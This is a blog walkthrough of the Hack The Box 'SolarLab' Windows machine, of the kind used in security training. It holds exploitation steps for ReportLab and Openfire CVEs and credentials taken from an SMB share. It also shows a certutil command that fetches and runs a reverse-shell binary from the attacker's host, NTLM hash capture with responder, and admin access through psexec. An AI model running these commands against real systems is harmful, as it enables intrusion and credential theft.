@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="HTB - Windows - Medium" />
+<meta name="keywords" content=", Windows" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/walkthroughs/solarlab/" />
+
+
+    <title>
+        
+            SolarLab :: TheFizzyFish 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="SolarLab">
+  <meta itemprop="description" content="HTB - Windows - Medium">
+  <meta itemprop="datePublished" content="2024-11-09T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-11-09T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1087">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Windows">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="SolarLab">
+  <meta name="twitter:description" content="HTB - Windows - Medium">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-11-09 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                $ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/solarlab/">SolarLab</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="enum">Enum</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 -oN all-ports.nmap $IP 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>6791/tcp open  hnm
+</span></span><span style="display:flex;"><span>7680/tcp open  pando-pub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p80,135,139,445,6791,7680 -A -oN service-scan.nmap $IP
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://solarlab.htb/
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>6791/tcp open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>7680/tcp open  pando-pub?
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>Port description:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">80</span> - HTTP running nginx 1.24 <span style="color:#f92672">(</span>solarlab.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/139/445 - Standard SMB related windows ports
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6791</span> - HTTP running nginx 1.24 <span style="color:#f92672">(</span>report.solarlab.htb:6791<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7680</span> - WUDO <span style="color:#f92672">(</span>Windows Update Delivery Optimization<span style="color:#f92672">)</span>, not super interesting
+</span></span></code></pre></div><p>Nmap scans found two hostnames <code>solarlab.htb</code> on port 80 and <code>report.solarlab.htb</code> on port 6791. Adding to my <code>/etc/hosts</code> file.</p>
+<p><img src="/Screenshots/SolarLab_image_1.png" alt=""></p>
+<h1 id="80--http">80 / HTTP</h1>
+<p><img src="/Screenshots/SolarLab_image_2.png" alt=""></p>
+<p>Looking at the source, just appears to be a static site. Footer has some theme information <code>jeweltheme</code>
+<img src="/Screenshots/SolarLab_image_3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Footer Section --&gt;</span>
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">footer</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;footer-section&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;copyright&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>				&amp;copy; &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[http://jeweltheme.com/html/kite/](view-source:http://jeweltheme.com/html/kite/)&#34;</span>&gt;Kite&lt;/<span style="color:#f92672">a</span>&gt; 2014-2015, All Rights Reserved. Designed by <span style="color:#960050;background-color:#1e0010">&amp;</span> Developed by &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[http://jeweltheme.com](view-source:http://jeweltheme.com/)&#34;</span>&gt;Jewel Theme&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>			&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">footer</span>&gt;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">&lt;!-- Footer Section End --&gt;</span>
+</span></span></code></pre></div><p>Running gobuster to enum and dirs or files, doesn&rsquo;t find anything interesting</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t <span style="color:#ae81ff">50</span> -x php -b <span style="color:#ae81ff">404</span> -o gobuster-80.out   
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/assets               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/assets/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/Images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/Images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 16210<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/Assets               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/Assets/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/IMAGES               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/IMAGES/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/con                  <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 177<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/ASSETS               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://solarlab.htb/ASSETS/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="6791--http">6791 / HTTP</h2>
+<p><img src="/Screenshots/SolarLab_image_4.png" alt=""></p>
+<p>Default page is a login form. Running gobuster, there may be some throttling or the server is just unstable as we start seeing 502 errors.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t <span style="color:#ae81ff">20</span> -x php -b <span style="color:#ae81ff">404</span> -o gobuster-6791.out 
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_5.png" alt=""></p>
+<p>Examining a login request with burp suite;
+<img src="/Screenshots/SolarLab_image_6.png" alt=""></p>
+<p>Running sqlmap against the request doesn&rsquo;t return any injectable parameters.</p>
+<p>Checking for other subdomains with ffuf:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>http://report.solarlab.htb:6791
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u $URL -H <span style="color:#e6db74">&#39;Host: FUZZ.solarlab.htb:6791&#39;</span> -fs <span style="color:#ae81ff">169</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>report                  <span style="color:#f92672">[</span>Status: 200, Size: 2045, Words: 772, Lines: 85, Duration: 39ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h2 id="445smb">445/SMB</h2>
+<p>Checking out the smb server to see if we can access any shares:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -U <span style="color:#e6db74">&#39;&#39;</span> -L <span style="color:#ae81ff">\\\\</span>solarlab.htb<span style="color:#ae81ff">\\</span>Documents<span style="color:#ae81ff">\\</span>  
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -U <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#ae81ff">\\\\</span>solarlab.htb<span style="color:#ae81ff">\\</span>Documents<span style="color:#ae81ff">\\</span> 
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_7.png" alt=""></p>
+<p>And we can read files from the <code>Documents</code> share. i&rsquo;m going to download all the files and check them out on my kali box.
+<img src="/Screenshots/SolarLab_image_8.png" alt=""></p>
+<p>Checking out <code>details-file.xlsx</code> gets us some potential creds and emails.</p>
+<p><img src="/Screenshots/SolarLab_image_9.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Usernames:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Alexander.knight@gmail.com
+</span></span><span style="display:flex;"><span>KAlexander
+</span></span><span style="display:flex;"><span>Alexander.knight@gmail.com
+</span></span><span style="display:flex;"><span>blake.byte
+</span></span><span style="display:flex;"><span>AlexanderK
+</span></span><span style="display:flex;"><span>ClaudiaS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Emails:
+</span></span><span style="display:flex;"><span>Alexander.knight@gmail.com
+</span></span><span style="display:flex;"><span>Alexander.knight@gmail.com
+</span></span><span style="display:flex;"><span>Claudia.springer@gmail.com
+</span></span><span style="display:flex;"><span>blake@purdue.edu
+</span></span><span style="display:flex;"><span>Alexander.knight@gmail.com
+</span></span><span style="display:flex;"><span>Claudia.springer@gmail.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Passwords:
+</span></span><span style="display:flex;"><span>al;ksdhfewoiuh
+</span></span><span style="display:flex;"><span>dkjafblkjadsfgl
+</span></span><span style="display:flex;"><span>d398sadsknr390
+</span></span><span style="display:flex;"><span>ThisCanB3typedeasily1@
+</span></span><span style="display:flex;"><span>danenacia9234n
+</span></span><span style="display:flex;"><span>dadsfawe9dafkn
+</span></span></code></pre></div><p>Nothing else really interesting in the other files.</p>
+<p>Lets see if we can use this to login to the web app.</p>
+<p><img src="/Screenshots/SolarLab_image_10.png" alt=""></p>
+<p>Not with those passwords, but we can identify user names. Responses of length 2419 have a different error than requests with usernames that don&rsquo;t exist.
+<code>User authentication error.</code>.</p>
+<p><img src="/Screenshots/SolarLab_image_11.png" alt=""></p>
+<p>This gives us two valid usernames for the app. We can take an educated guess and add <code>blakeb</code> as this seems to be the correct format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ClaudiaS
+</span></span><span style="display:flex;"><span>AlexanderK
+</span></span><span style="display:flex;"><span>blakeb
+</span></span></code></pre></div><p>Adding the username <code>blakeb</code> and re-running intruder gets us a valid login with
+<code>blakeb:ThisCanB3typedeasily1@</code>
+<img src="/Screenshots/SolarLab_image_12.png" alt=""></p>
+<p><img src="/Screenshots/SolarLab_image_13.png" alt=""></p>
+<p>We can use the app to generate PDFs.</p>
+<p><img src="/Screenshots/SolarLab_image_14.png" alt="">
+<img src="/Screenshots/SolarLab_image_15.png" alt="">
+<img src="/Screenshots/SolarLab_image_16.png" alt=""></p>
+<p>Looking at the PDF that&rsquo;s returned the app is using ReportLab for PDF generation
+<img src="/Screenshots/SolarLab_image_17.png" alt=""></p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>There&rsquo;s a vulnerability within certain version of ReportLab allowing code exection.</p>
+<blockquote>
+<p>CVE-2023-33733 is a Remote Code Execution (RCE) vulnerability residing in the HTML parsing functionality of Reportlab, a popular Python library used for generating PDF documents from HTML data. This vulnerability allows attackers to execute arbitrary code on the system running the vulnerable Reportlab version. Reportlab&rsquo;s HTML parser suffers from improper handling of certain HTML elements, specifically those lacking proper closing tags. An attacker can exploit this by crafting a malicious HTML snippet containing an unclosed <!-- raw HTML omitted --> tag with a specially crafted src attribute. When Reportlab attempts to parse this element, the lack of a closing tag can lead to unintended code execution due to how the parser processes the following content.</p>
+</blockquote>
+<p>There&rsquo;s multiple exploits on github for this, I attempted to manually exploit it with the payload from <a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0">https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0</a> but was having issues due to character limits in the <code>user_input</code> field of the request.</p>
+<p><img src="/Screenshots/SolarLab_image_18.png" alt="">
+<img src="/Screenshots/SolarLab_image_19.png" alt=""></p>
+<p>Found another version of the exploit that works and gets us a reverse powershell shell.
+<a href="https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC">https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC</a>
+<img src="/Screenshots/SolarLab_image_20.png" alt=""></p>
+<p><img src="/Screenshots/SolarLab_image_21.png" alt="">
+![](/Screenshots/Pasted image 20240831165228.png)</p>
+<h2 id="exploits">Exploits</h2>
+<p><a href="https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC">https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC</a></p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Downloaded winipeas to the box to check for any easy escalations.</p>
+<p><img src="/Screenshots/SolarLab_image_22.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>lake<span style="color:#ae81ff">\D</span>esktop&gt; type ../Documents/start-app.bat
+</span></span><span style="display:flex;"><span>@ECHO OFF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd <span style="color:#e6db74">&#34;c:\users\blake\documents\app&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:loopstart
+</span></span><span style="display:flex;"><span>START /B waitress-serve.exe --listen 127.0.0.1:5000 --threads <span style="color:#ae81ff">10</span> app:app
+</span></span><span style="display:flex;"><span>timeout /t <span style="color:#ae81ff">600</span> /nobreak &gt; NUL
+</span></span><span style="display:flex;"><span>taskkill /f /im python3.11.exe 
+</span></span><span style="display:flex;"><span>timeout /t <span style="color:#ae81ff">5</span> /nobreak &gt; NUL
+</span></span><span style="display:flex;"><span>goto loopstart
+</span></span></code></pre></div><p><code>start-app.bat</code>, has a service listening on localhost:5000. Looking into it it&rsquo;s just the instance of reportlab. Winpeas didn&rsquo;t pick it up for some reason but running netstat shows a listening port on 9090.</p>
+<p><img src="/Screenshots/SolarLab_image_23.png" alt=""></p>
+<p>Setting up a reverse socks proxy with chisel so we can view the app on port 9090 from our browser.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab/www<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./chisel_arm server --reverse --port <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>lake<span style="color:#ae81ff">\D</span>esktop&gt; ./chisel.exe client 10.10.14.7:443 R:socks
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_24.png" alt=""></p>
+<p><code>Openfire, Version: 4.7.4</code>
+<a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT</a></p>
+<p>There&rsquo;s an exploit for OpenFire and this version doesn&rsquo;t appear to be patched.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab/CVE-2023-32315-EXPLOIT<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ proxychains python3 CVE-2023-32315.py -u http://localhost:9090
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching exploit against: http://localhost:9090
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking <span style="color:#66d9ef">if</span> the target is vulnerable
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target is vulnerable
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Adding credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully added, here are the credentials
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username: hugme
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password: HugmeNOW
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_25.png" alt=""></p>
+<p><img src="/Screenshots/SolarLab_image_26.png" alt=""></p>
+<p>And we can login to the web server.</p>
+<p><img src="/Screenshots/SolarLab_image_27.png" alt=""></p>
+<p>Uploaded plugin
+<img src="/Screenshots/SolarLab_image_28.png" alt=""></p>
+<p>We can then find the tool at Server &raquo; Server Settings &raquo; Management Tool and we can plugin the password to access the web shell.</p>
+<p><img src="/Screenshots/SolarLab_image_29.png" alt=""></p>
+<p>We can select system command from the pull down to execute commands
+<img src="/Screenshots/SolarLab_image_30.png" alt=""></p>
+<p>We can get a shell as the openfire user by downloading a rev shell and then sending a second command to execute it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.7:9002/fish-9003.exe fish.exe 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./fish.exe
+</span></span></code></pre></div><p>We can capture the hash for the user by setting up responder then performing a curl request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\O</span>penfire&gt;curl.exe file://10.10.14.7/test
+</span></span><span style="display:flex;"><span>curl.exe file://10.10.14.7/test
+</span></span><span style="display:flex;"><span>curl: <span style="color:#f92672">(</span>37<span style="color:#f92672">)</span> Couldn<span style="color:#960050;background-color:#1e0010">&#39;</span>t open file //10.10.14.7/test
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_31.png" alt=""></p>
+<p><img src="/Screenshots/SolarLab_image_32.png" alt=""></p>
+<p>Openfire db script with the admin&rsquo;s password</p>
+<pre tabindex="0"><code>C:\Program Files\Openfire\embedded-db&gt;type openfire.script
+</code></pre><p>We can download a tool to crack it</p>
+<p><a href="https://github.com/c0rdis/openfire_decrypt/blob/master/OpenFireDecryptPass.java">https://github.com/c0rdis/openfire_decrypt/blob/master/OpenFireDecryptPass.java</a></p>
+<p>We need the encrypted password and the password key
+<img src="/Screenshots/SolarLab_image_33.png" alt="">
+<img src="/Screenshots/SolarLab_image_34.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hGXiFzsKaAeYLjn
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/solarlab/www<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>ThisPasswordShouldDo!@ <span style="color:#f92672">(</span>hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><img src="/Screenshots/SolarLab_image_35.png" alt=""></p>
+<p>And we got the admin&rsquo;s password!</p>
+<pre tabindex="0"><code>administrator:ThisPasswordShouldDo!@
+</code></pre><p>We can then access the box with psexec.py and grab the admin flag.
+<img src="/Screenshots/SolarLab_image_36.png" alt=""></p>
+<h2 id="exploits-1">Exploits</h2>
+<p><a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT</a></p>
+<hr>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/windows/">Windows</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Four Gnomes in a Hoodie</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
